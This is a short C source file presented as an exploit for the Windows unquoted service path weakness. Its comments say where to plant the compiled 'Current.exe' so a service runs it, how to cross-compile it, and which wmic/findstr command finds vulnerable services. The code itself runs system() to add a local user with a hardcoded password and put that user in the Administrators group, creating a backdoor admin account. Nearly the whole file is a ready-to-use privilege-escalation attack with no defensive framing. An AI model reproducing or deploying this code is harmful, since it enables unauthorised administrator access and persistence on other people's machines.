#include <stdlib.h>
#include <stdio.h>

/*
 * win-unquoted-svc - Unquoted Service Path Exploit
 *
 * For a service with path:
 *   C:\Program Files\Enterprise Apps\Current Version\service.exe
 *
 * Place this as "Current.exe" in "C:\Program Files\Enterprise Apps\"
 * The service will execute this before finding the real binary.
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-gcc main.c -o Current.exe
 *
 * Find targets:
 *   wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
 *
 */

// -- CONFIGURE THESE --------------------------------------
#define USERNAME "svcadmin"
#define PASSWORD "Svc_P@ss1!"
// ---------------------------------------------------------

int main(void) {
    system("net user " USERNAME " " PASSWORD " /add");
    system("net localgroup Administrators " USERNAME " /add");
    return 0;
}
